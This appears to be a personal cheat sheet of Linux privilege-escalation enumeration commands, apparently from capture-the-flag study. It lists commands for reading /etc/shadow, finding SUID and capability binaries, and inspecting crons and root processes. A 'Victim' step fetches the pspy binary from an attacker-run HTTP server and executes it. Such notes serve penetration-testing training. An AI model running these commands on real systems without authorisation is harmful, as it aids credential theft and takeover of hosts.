# Linux



## **Gathering Info**

```
whoami
```

```
uname -a
```

```
cat /etc/passwd
cat /etc/shadow
```

### Crontab

```
cat /etc/crontab
```

Possible other places crons are running

```
cat /etc/cron.d/
```

## Sudo/SUID/Capabilities <a href="#user-content-sudosuidcapabilities" id="user-content-sudosuidcapabilities"></a>

Run all of these commands then check [https://gtfobins.github.io/](https://gtfobins.github.io/) . They may give different results

**Files with SUID-bit set**

```
sudo -l
```

```
find / -perm -u=s -type f 2> /dev/null 
```

| Finding | Comments                                                                                                                                                    |
| ------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------- |
| setcap  | If setcap is set that is very interesting checkout room [annie.md](../../walkthroughs/tryhackme/annie.md "mention") for an example for privilege escalation |
|         |                                                                                                                                                             |
|         |                                                                                                                                                             |

```
getcap -r / 2>/dev/null
```





**Files where group permissions equal to "writable"**

```
find / -type f -perm /g=w -exec ls -l {} + 2> /dev/null 
```

```
ps aux | grep -v "\[" | grep root
```

```
dpkg -l # debian
```

```
rpm -qa # red hat
```

```
pacman -Qe # arch linux
```

**Look at open ports**

```
ss -ltp
```

##

```
getcap -r / 2>/dev/null
```

##

## PSPY

script that can monitor linux processes without root access

**Kali**

```
wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy32 
python2 -m SimpleHTTPServer 81
```

**Victim**

```
wget http://$KALI:81/pspy32 
chmod +x pspy32 
./pspy32 
```





Copy Material from here:

[https://tryhackme.com/room/linprivesc](https://tryhackme.com/room/linprivesc)



**Automated Enumeration Tools**

| Name                          | Link                                                                                                                                                                                           |
| ----------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| LinPeas                       | [https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS) |
| LinEnum                       | [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)                                                                                                                 |
| LES (Linux Exploit Suggester) | [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)                                                                                           |
| Linux Smart Enumeration       | [https://github.com/diego-treitos/linux-smart-enumeration](https://github.com/diego-treitos/linux-smart-enumeration)                                                                           |
| Linux Priv Checker:           | [https://github.com/linted/linuxprivchecker](https://github.com/linted/linuxprivchecker)                                                                                                       |



## Other Cheat sheets

[https://github.com/RoqueNight/Linux-Privilege-Escalation-Basics](https://github.com/RoqueNight/Linux-Privilege-Escalation-Basics)

